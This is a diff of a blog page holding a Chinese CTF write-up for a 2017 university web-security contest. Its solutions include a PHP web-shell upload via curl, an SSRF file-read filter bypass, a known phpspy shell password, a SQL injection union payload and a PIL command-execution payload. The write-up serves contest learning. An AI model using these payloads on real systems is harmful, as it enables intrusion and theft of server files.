@@ -15,22 +15,13 @@
 <meta property="og:url" content="https://www.codemonster.cn/2017/10/24/2017-mooctest-second-writeup/index.html">
 <meta property="og:site_name" content="打代码的怪兽 CodeMonster">
 <meta property="og:description" content="周末去广州水了一波，比赛的时候做出来7道题，赛后补上2、3两题，下面是前9题的WriteUp，期待大佬的第10题WriteUp">
-<meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-1.png">
-<meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-2.png">
-<meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-3.png">
-<meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-4.png">
 <meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-5.png">
 <meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-6.png">
-<meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-7.png">
-<meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-8.png">
-<meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-9.png">
-<meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-10.png">
-<meta property="og:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-11.png">
-<meta property="og:updated_time" content="2018-05-04T07:47:50.012Z">
+<meta property="og:updated_time" content="2018-05-31T09:06:32.436Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2017 全国大学生软件测试大赛web安全赛分区决赛 WriteUp">
 <meta name="twitter:description" content="周末去广州水了一波，比赛的时候做出来7道题，赛后补上2、3两题，下面是前9题的WriteUp，期待大佬的第10题WriteUp">
-<meta name="twitter:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-1.png">
+<meta name="twitter:image" content="https://www.codemonster.cn/img/2017-mooctest-sec-5.png">
   
     <link rel="alternative" href="/atom.xml" title="打代码的怪兽 CodeMonster" type="application/atom+xml">
   
@@ -190,22 +181,20 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>周末去广州水了一波，比赛的时候做出来7道题，赛后补上2、3两题，下面是前9题的WriteUp，期待大佬的第10题WriteUp<br><a id="more"></a></p>
-<h2 id="1-host"><a href="#1-host" class="headerlink" title="1.host"></a>1.host</h2><p>在burpsuite中修改host为<code>www.mooctest.net</code><br><img src="/img/2017-mooctest-sec-1.png" alt=""></p>
+<h2 id="1-host"><a href="#1-host" class="headerlink" title="1.host"></a>1.host</h2><p>在burpsuite中修改host为<code>www.mooctest.net</code></p>
 <h2 id="2-Babyupload"><a href="#2-Babyupload" class="headerlink" title="2.Babyupload"></a>2.Babyupload</h2><p>扫描得到upload.php，本地构造upload.html<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action=<span class="string">"http://114.55.36.69:46012/upload.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"upfile"</span>&gt;文件名：&lt;/label&gt;</div><div class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
 <p>比赛的时候死活猜不出文件参数名，file、upload、uploadfile都试过，赛后经大佬提醒才知道是<code>upfile</code><br>也可以直接用curl上传文件，学到了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://114.55.36.69:46012/upload.php -F &quot;upfile=@x.php&quot;</div></pre></td></tr></table></figure></p>
-<p>上传后菜刀连接，查看web目录下的flag.php拿到flag<br><img src="/img/2017-mooctest-sec-2.png" alt=""></p>
+<p>上传后菜刀连接，查看web目录下的flag.php拿到flag</p>
 <h2 id="3-curl"><a href="#3-curl" class="headerlink" title="3.curl"></a>3.curl</h2><p>过滤了<code>file:</code>后面的<code>/</code>，把<code>/</code>转成<code>0x2f</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:46013/index.php?url=file:0x2f0x2f/var/www/html/index.php</div></pre></td></tr></table></figure></p>
-<p><img src="/img/2017-mooctest-sec-3.png" alt=""></p>
-<h2 id="4-war"><a href="#4-war" class="headerlink" title="4.war"></a>4.war</h2><p>根据题目提示，下载trick-or-treat.war<br><img src="/img/2017-mooctest-sec-4.png" alt=""></p>
+<h2 id="4-war"><a href="#4-war" class="headerlink" title="4.war"></a>4.war</h2><p>根据题目提示，下载trick-or-treat.war</p>
 <h2 id="5-readme2"><a href="#5-readme2" class="headerlink" title="5.readme2"></a>5.readme2</h2><p>在js文件里发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:46015/test/show.do?page=help.jsp</div></pre></td></tr></table></figure></p>
-<p>猜测是任意文件读取，读取javaweb工程的<code>WEB-INF/web.xml</code>文件<br><img src="/img/2017-mooctest-sec-5.png" alt=""><br>接着读取<code>WEB-INF/properties/configInfo.properties</code><br><img src="/img/2017-mooctest-sec-6.png" alt=""><br>发现<code>key.jsp</code>，读取<code>key.jsp</code><br><img src="/img/2017-mooctest-sec-7.png" alt=""></p>
-<h2 id="6-source-ip"><a href="#6-source-ip" class="headerlink" title="6.source ip"></a>6.source ip</h2><p>去fofa搜标题，试了三四个就试出来了，听说还有发邮件姿势更优雅<br><img src="/img/2017-mooctest-sec-8.png" alt=""></p>
+<p>猜测是任意文件读取，读取javaweb工程的<code>WEB-INF/web.xml</code>文件<br><img src="/img/2017-mooctest-sec-5.png" alt=""><br>接着读取<code>WEB-INF/properties/configInfo.properties</code><br><img src="/img/2017-mooctest-sec-6.png" alt=""><br>发现<code>key.jsp</code>，读取<code>key.jsp</code></p>
+<h2 id="6-source-ip"><a href="#6-source-ip" class="headerlink" title="6.source ip"></a>6.source ip</h2><p>去fofa搜标题，试了三四个就试出来了，听说还有发邮件姿势更优雅</p>
 <h2 id="7-hackedsite"><a href="#7-hackedsite" class="headerlink" title="7.hackedsite"></a>7.hackedsite</h2><p>扫描得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:46017/upload/phpspy.php</div></pre></td></tr></table></figure></p>
-<p>百度搜索phpspy得到密码<code>angle</code>，连接大马拿到flag<br><img src="/img/2017-mooctest-sec-9.png" alt=""></p>
+<p>百度搜索phpspy得到密码<code>angle</code>，连接大马拿到flag</p>
 <h2 id="8-babysql3"><a href="#8-babysql3" class="headerlink" title="8.babysql3"></a>8.babysql3</h2><p>name字段存在注入，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">keyname=1&amp;name=name` union select 1,2,flag from flag %23</div></pre></td></tr></table></figure></p>
-<p><img src="/img/2017-mooctest-sec-10.png" alt=""></p>
 <h2 id="9-snake"><a href="#9-snake" class="headerlink" title="9.snake"></a>9.snake</h2><p>提示了<code>PIL-RCE</code><br>参考<a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md" target="_blank" rel="noopener">https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md</a><br>构造poc文件中的代码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(%pipe%cat /var/www/Flask/flag &gt; tmp/fffffff.png)</div></pre></td></tr></table></figure></p>
-<p>上传得到flag<br><img src="/img/2017-mooctest-sec-11.png" alt=""></p>
+<p>上传得到flag</p>
 <h2 id="10-thinkphp5"><a href="#10-thinkphp5" class="headerlink" title="10.thinkphp5"></a>10.thinkphp5</h2><p>无</p>
 
       
@@ -547,22 +536,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Web</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CBC字节翻转攻击</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Padding oracle攻击</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
               </li>
              
@@ -571,15 +544,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">加固</a>
+                <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">上传</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -588,6 +557,22 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">盲注</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">加固</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Crypto</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -603,19 +588,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Crypto</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Struts2</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">apache</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">https</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -635,11 +608,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CVE</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">WordPress</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">apache</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">https</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -667,11 +652,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">递归</a>
+                <a href="javascript:void(0)" class="js-tag color5">CBC字节翻转攻击</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
+                <a href="javascript:void(0)" class="js-tag color2">Padding oracle攻击</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">递归</a>
               </li>
             
             <div class="clearfix"></div>
